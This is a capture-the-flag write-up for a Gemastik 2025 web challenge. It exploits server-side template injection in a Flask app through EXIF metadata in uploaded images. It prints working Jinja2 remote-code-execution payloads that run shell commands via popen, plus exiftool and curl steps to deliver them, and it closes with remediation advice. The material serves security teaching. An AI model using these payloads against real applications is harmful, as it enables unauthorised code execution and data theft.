# CDN Challenge - CTF Writeup

## Quick Summary

**Vulnerability:** Server-Side Template Injection (SSTI) in Flask application  
**Impact:** Remote Code Execution (RCE)  
**Flag Location:** `/flag.txt`  
**Difficulty:** Medium

## Vulnerability Overview

The application contains a critical SSTI vulnerability in the `/post/<int:pid>` endpoint where EXIF metadata from uploaded images is extracted and injected directly into a Jinja2 template without proper escaping.

### Vulnerable Code Flow

1. User uploads an image with malicious EXIF metadata
2. Application extracts "File Name" and "Date Created" fields using `exiftool`
3. These values are inserted directly into HTML: `f"<pre>File Name: {file_name_val}..."`
4. The HTML is injected into the template string
5. `render_template_string()` executes the template, processing any Jinja2 syntax

### Key Vulnerability Location

**File:** `chall/app.py`, Lines 242-259

```python
# Lines 248-250: User-controlled metadata extracted
file_name_val = md_map["File Name"]
date_created_val = md_map["Date Created"]
metadata_snippet_html = f"<pre>File Name: {file_name_val}\nDate Created: {date_created_val}</pre>"

# Line 258: Unescaped data injected into template
page_src = tpl_src.replace(placeholder, metadata_snippet_html)

# Line 259: Template rendered with user data
return render_template_string(page_src, post=post)
```

## Exploitation

### Automated Exploitation

Use the provided exploit script:

```bash
# Install dependencies (if not already installed)
sudo apt-get install imagemagick libimage-exiftool-perl

# Run the exploit
python3 exploit.py --payload flag

# Test SSTI first
python3 exploit.py --payload test

# For remote target
python3 exploit.py --target http://target-ip:4500 --payload flag
```

### Manual Exploitation Steps

1. **Create malicious image:**

```bash
# Create a simple image
convert -size 100x100 xc:white exploit.png

# Inject SSTI payload into EXIF metadata
exiftool -FileName='{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}' exploit.png
```

2. **Register and login:**

```bash
# Register
curl -X POST http://localhost:4500/register \
  -d "username=hacker&password=pass123"

# Login and save cookies
curl -X POST http://localhost:4500/login \
  -d "username=hacker&password=pass123" \
  -c cookies.txt -L
```

3. **Upload malicious image:**

```bash
curl -X POST http://localhost:4500/upload \
  -b cookies.txt \
  -F "title=Exploit" \
  -F "image=@exploit.png" \
  -L
```

4. **Trigger SSTI and get flag:**

```bash
# Get post ID from gallery, then view it
curl http://localhost:4500/gallery -b cookies.txt
curl http://localhost:4500/post/1 -b cookies.txt
```

The flag will be in the HTML response where the "File Name" metadata is displayed.

## Alternative Payloads

### Simple Test (7\*7 = 49)

```python
{{ 7*7 }}
```

### Read flag using lipsum

```python
{{ lipsum.__globals__.os.popen("cat /flag.txt").read() }}
```

### Read flag using config

```python
{{ config.__class__.__init__.__globals__["os"].popen("cat /flag.txt").read() }}
```

### RCE to list files

```python
{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("ls -la /").read() }}
```

### Using get_flashed_messages

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read() }}
```

## Files Included

- `VULNERABILITY_ANALYSIS.md` - Detailed vulnerability analysis and remediation
- `exploit.py` - Automated exploitation script
- `chall/` - Original challenge files

## Technical Details

### Why This Works

1. **EXIF Metadata is User-Controlled:** Attackers can set arbitrary EXIF fields in images
2. **No Input Validation:** The application trusts EXIF data without sanitization
3. **String Interpolation:** F-strings directly insert untrusted data into templates
4. **Dynamic Template Rendering:** `render_template_string()` processes Jinja2 syntax in the injected data

### Attack Chain

```
Attacker creates malicious image
    ↓
Sets EXIF "File Name" field to Jinja2 payload
    ↓
Uploads image to application
    ↓
Application extracts EXIF metadata with exiftool
    ↓
Metadata stored in database
    ↓
User views post
    ↓
Application inserts EXIF data into template string
    ↓
render_template_string() executes Jinja2 payload
    ↓
Remote Code Execution achieved
    ↓
Flag read from /flag.txt
```

## Defense Recommendations

1. **Never use `render_template_string()` with user data**
2. **Always escape user-controlled data** with `markupsafe.escape()`
3. **Use static templates** and pass data as variables
4. **Enable Jinja2 autoescape** for all templates
5. **Validate and sanitize EXIF metadata** before use
6. **Apply principle of least privilege** (app shouldn't run as root)

## References

- [HackTricks SSTI Guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/2.3.x/security/)

## Challenge Info

**Event:** Gemastik 2025 Final  
**Category:** Web Security  
**Challenge:** CDN Services  
**Difficulty:** Medium  
**Flag Format:** `GEMASTIK{...}`

